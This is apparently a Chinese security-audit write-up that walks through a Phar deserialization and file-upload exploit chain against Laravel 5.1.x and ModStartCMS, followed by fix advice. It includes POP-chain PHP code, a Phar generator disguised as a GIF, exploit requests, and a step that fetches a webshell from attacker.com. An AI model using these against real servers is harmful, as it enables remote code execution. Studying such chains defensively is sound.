引言

Laravel作为PHP领域最流行的Web开发框架，其优雅的语法和丰富的功能深受开发者喜爱。然而，框架的安全性问题同样值得关注，尤其是反序列化漏洞这类“隐形杀手”。本文将以Laravel 5.1.x版本及基于Laravel构建的ModStartCMS为例，深入分析Phar反序列化漏洞、任意文件上传漏洞，并详细拆解一条从WindowsPipes析构函数到RCE的完整POP链。通过理论与实践结合的方式，帮助安全人员掌握Laravel代码审计的核心思路。

一、漏洞背景：反序列化与Phar协议

1.1 反序列化漏洞原理

PHP反序列化漏洞通常出现在程序对用户可控的序列化数据执行unserialize()时。攻击者可以构造特殊的序列化字符串，在反序列化过程中自动触发某些对象的魔术方法（如__destruct()、__toString()、__call()等），进而利用这些方法中的危险操作（如文件读写、命令执行）实现攻击。

1.2 Phar反序列化特性

Phar文件（PHP Archive）除了存储文件外，还可以在元数据（metadata）中存储序列化数据。当使用phar://协议访问Phar文件时，PHP会自动反序列化其元数据。如果程序中有file_exists()、file_get_contents()等函数操作phar://路径，就可能触发反序列化。这种利用方式无需调用unserialize()，隐蔽性更强。

二、漏洞分析：ModStartCMS中的两个入口点

2.1 环境搭建

从Gitee下载ModStartCMS（https://gitee.com/modstart/ModStartCMS），按照官方文档在phpstudy中完成安装。目标版本：Laravel 5.1.x（ModStartCMS基于此构建）。

2.2 Phar反序列化漏洞（Laravel 5.1.x）

漏洞点定位

在Laravel 5.1.x中，file_exists()函数存在一处可触发Phar反序列化的调用链：savePathToLocalTemp方法内部调用了file_exists()。通过搜索该方法的调用，发现avatar参数的处理过程会触发此链。

参考阿里云先知社区文章（https://xz.aliyun.com/news/10770），攻击者可通过上传头像功能，传入`phar://`协议的路径，触发反序列化。

POP链构造

要实现RCE，需要构造一条从反序列化到命令执行的POP链。根据已知链，利用Symfony\Component\Process\Pipes\WindowsPipes的__destruct()方法调用removeFiles()，进而调用file_exists()。但这里的file_exists()参数可控吗？实际上，WindowsPipes的$files属性在析构时会被遍历并调用file_exists()（如果文件存在则执行unlink()）。如果我们能控制$files中的元素为一个对象，那么当该对象被传递给file_exists()时，如果该对象定义了__toString()方法，就会触发它。

因此，我们构造：

· WindowsPipes的$files数组包含一个Illuminate\View\View对象。
· View的__toString()方法会调用$this->factory->getEngine()->get($this->view)，但更关键的，在render()过程中会调用$this->factory（一个DatabaseManager对象）的__call()方法。
· DatabaseManager的__call()方法中调用了call_user_func_array($this->extensions[$method], ...)，其中$method是未定义的方法名，这里我们可以通过控制$extensions和$app['config']实现任意函数调用。

详细POP链如下：

```php
namespace Illuminate\Database;
class DatabaseManager {
    protected $extensions = ['calc.exe' => 'call_user_func'];
    protected $app = ['config' => ['database.connections' => ['calc.exe' => 'system'], 'database.default' => 'calc.exe']];
}

namespace Illuminate\View;
class View {
    protected $factory;
    public function __construct() {
        $this->factory = new \Illuminate\Database\DatabaseManager();
    }
}

namespace Symfony\Component\Process\Pipes;
class WindowsPipes {
    private $files = [];
    public function __construct() {
        $this->files = [new \Illuminate\View\View()];
    }
}
```

当View对象被反序列化并进入file_exists()时，__toString()被触发，最终执行call_user_func('system', 'calc.exe')。

生成Phar文件

利用上述POP链生成Phar文件，并设置GIF文件头绕过简单检测：

```php
$exp = new WindowsPipes();
@unlink("laravel5_exp.phar");
$phar = new Phar("laravel5_exp.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($exp);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

上传该文件到服务器（可通过后续任意文件上传漏洞），然后通过头像功能触发：

```
GET /?type=&avatar=phar://./data/file/2025/10/04/10942_crtz_7818.jpg
```

注意type参数为空，以进入默认分支。

2.3 任意文件上传漏洞（ModStartCMS）

漏洞点定位

ModStartCMS的头像上传功能中，根据type参数决定上传逻辑。在默认分支（default）中，代码直接将文件内容写入路径，未对文件类型进行严格校验。

```php
switch ($input->getTrimString('type')) {
    // ... 其他分支
    default:
        $path = md5($appKey . ':' . $path); // 生成文件名
        file_put_contents($tempPath, $content); // 写入内容
        break;
}
```

由于type参数为空时进入default，攻击者可以上传任意文件，包括PHP脚本。虽然文件名经过MD5处理，但文件内容完全可控。

利用方式

攻击者可以上传一个包含恶意代码的PHP文件，例如通过远程URL写入webshell：

```
GET /?type=&avatar=http://attacker.com/test.PHP
```

服务器会抓取http://attacker.com/test.PHP的内容并保存到data/file/日期/目录下，文件名为md5($appKey.':'.$path)，由于$appKey未知，但可以通过其他信息泄露获取，或直接爆破。

实际攻击中，可以将Phar文件与文件上传结合：先上传一个包含恶意元数据的Phar文件（伪装成图片），再利用Phar反序列化触发RCE。

2.4 反序列化POP链深入：文件删除与RCE

除了上述完整的RCE链，Laravel中还存在一些简单的POP链，例如文件删除。

文件删除POP链

WindowsPipes的析构函数中，removeFiles()会遍历$files并调用unlink()。如果$files中存放的是字符串路径，则会直接删除该文件。因此，构造如下：

```php
namespace Symfony\Component\Process\Pipes;
class WindowsPipes {
    private $files = ['c:\\a.txt']; // 目标文件路径
}
$exp = new WindowsPipes();
echo serialize($exp);
```

反序列化后，a.txt将被删除。这可用于任意文件删除漏洞。

RCE POP链（完整版）

上文已展示了通过View和DatabaseManager实现RCE的链。需要注意的是，该链依赖于Laravel的某些版本特性（如DatabaseManager的__call），实际利用时需要根据目标版本调整命名空间和类结构。

三、实战演练：从任意文件上传到RCE

3.1 上传Phar文件

首先，利用任意文件上传漏洞，将构造好的laravel5_exp.phar文件上传到服务器。假设上传后路径为/data/file/2025/10/04/10942_crtz_7818.jpg。

3.2 触发反序列化

通过头像功能，传入phar://路径：

```
POST /avatar/upload HTTP/1.1
...
type=&avatar=phar://./data/file/2025/10/04/10942_crtz_7818.jpg
```

由于file_exists()处理了该路径，Phar元数据被反序列化，触发POP链，执行system('calc.exe')（实际攻击中替换为反弹Shell命令）。

3.3 验证结果

在服务器上监听端口，如果收到连接，则说明RCE成功。

四、漏洞修复建议

4.1 针对Phar反序列化

· 升级Laravel到5.1.x以上版本，新版本中已修复相关调用链。
· 避免在文件操作函数中使用用户可控的路径，特别是phar://协议。
· 使用stream_get_meta_data()检测文件流，禁用phar包装器：stream_wrapper_unregister('phar')。

4.2 针对任意文件上传

· 对上传文件进行严格类型校验，使用白名单而非黑名单。
· 文件保存时，不要直接使用用户提供的文件名，应生成随机文件名，并存储文件到非Web可访问目录。
· 对上传内容进行病毒扫描或二次编码。

4.3 反序列化漏洞通用修复

· 避免在项目中直接使用unserialize()处理用户输入。
· 使用更安全的序列化格式，如JSON。
· 开启对象哈希验证或使用allowed_classes选项限制反序列化的类。

五、总结

本文以ModStartCMS为例，详细分析了Laravel框架中存在的Phar反序列化漏洞和任意文件上传漏洞，并构造了从反序列化到RCE的完整POP链。通过实战演练，展示了如何将这些漏洞组合利用，最终获取服务器权限。

代码审计中，反序列化漏洞往往隐藏在看似无害的魔术方法中，而文件操作函数（如file_exists）可能成为触发点。安全人员需要深入理解框架底层实现，才能发现这些潜在风险。同时，框架开发者应关注官方安全更新，及时修补已知漏洞。

（注：本文所有漏洞分析及利用仅限安全研究，请勿用于非法用途。）
